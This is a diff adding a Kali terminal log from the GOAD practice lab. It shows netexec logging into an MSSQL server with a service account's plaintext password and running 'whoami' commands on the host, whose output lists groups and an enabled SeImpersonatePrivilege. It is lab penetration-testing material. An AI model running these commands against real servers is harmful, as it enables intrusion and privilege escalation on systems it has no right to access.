@@ -1,0 +1,58 @@
+──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ netexec mssql 192.168.56.22 -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee' -x "whoami /priv"
+MSSQL       192.168.56.22   1433   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
+MSSQL       192.168.56.22   1433   CASTELBLACK      [+] north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee (Pwn3d!)
+MSSQL       192.168.56.22   1433   CASTELBLACK      [+] Executed command via mssqlexec
+MSSQL       192.168.56.22   1433   CASTELBLACK      PRIVILEGES INFORMATION
+MSSQL       192.168.56.22   1433   CASTELBLACK      ----------------------
+MSSQL       192.168.56.22   1433   CASTELBLACK      Privilege Name                Description                               State
+MSSQL       192.168.56.22   1433   CASTELBLACK      ============================= ========================================= ========
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeCreateGlobalPrivilege       Create global objects                     Enabled
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ netexec mssql 192.168.56.22 -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee' -x "whoami /all" 
+MSSQL       192.168.56.22   1433   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
+MSSQL       192.168.56.22   1433   CASTELBLACK      [+] north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee (Pwn3d!)
+MSSQL       192.168.56.22   1433   CASTELBLACK      [+] Executed command via mssqlexec
+MSSQL       192.168.56.22   1433   CASTELBLACK      USER INFORMATION
+MSSQL       192.168.56.22   1433   CASTELBLACK      ----------------
+MSSQL       192.168.56.22   1433   CASTELBLACK      User Name     SID
+MSSQL       192.168.56.22   1433   CASTELBLACK      ============= ==============================================
+MSSQL       192.168.56.22   1433   CASTELBLACK      north\sql_svc S-1-5-21-1979940629-3296874960-2516319631-1121
+MSSQL       192.168.56.22   1433   CASTELBLACK      GROUP INFORMATION
+MSSQL       192.168.56.22   1433   CASTELBLACK      -----------------
+MSSQL       192.168.56.22   1433   CASTELBLACK      Group Name                                 Type             SID                                                             Attributes                                                                                                                              
+MSSQL       192.168.56.22   1433   CASTELBLACK      ========================================== ================ =============================================================== ==================================================                                                                                      
+MSSQL       192.168.56.22   1433   CASTELBLACK      Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group                                                                                      
+MSSQL       192.168.56.22   1433   CASTELBLACK      BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group                                                                                      
+MSSQL       192.168.56.22   1433   CASTELBLACK      BUILTIN\Performance Monitor Users          Alias            S-1-5-32-558                                                    Mandatory group, Enabled by default, Enabled group                                                                                      
+MSSQL       192.168.56.22   1433   CASTELBLACK      NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group                                                                                      
+MSSQL       192.168.56.22   1433   CASTELBLACK      CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group                                                                                      
+MSSQL       192.168.56.22   1433   CASTELBLACK      NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group                                                                                      
+MSSQL       192.168.56.22   1433   CASTELBLACK      NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group                                                                                      
+MSSQL       192.168.56.22   1433   CASTELBLACK      NT SERVICE\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner                                                                                          
+MSSQL       192.168.56.22   1433   CASTELBLACK      LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group                                                                                      
+MSSQL       192.168.56.22   1433   CASTELBLACK      Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group                                                                                      
+MSSQL       192.168.56.22   1433   CASTELBLACK      Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+MSSQL       192.168.56.22   1433   CASTELBLACK      PRIVILEGES INFORMATION
+MSSQL       192.168.56.22   1433   CASTELBLACK      ----------------------
+MSSQL       192.168.56.22   1433   CASTELBLACK      Privilege Name                Description                               State
+MSSQL       192.168.56.22   1433   CASTELBLACK      ============================= ========================================= ========
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeCreateGlobalPrivilege       Create global objects                     Enabled
+MSSQL       192.168.56.22   1433   CASTELBLACK      SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+MSSQL       192.168.56.22   1433   CASTELBLACK      USER CLAIMS INFORMATION
+MSSQL       192.168.56.22   1433   CASTELBLACK      -----------------------
+MSSQL       192.168.56.22   1433   CASTELBLACK      User claims unknown.
+MSSQL       192.168.56.22   1433   CASTELBLACK      Kerberos support for Dynamic Access Control on this device has been disabled.
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/GOAD]
+└─$ 
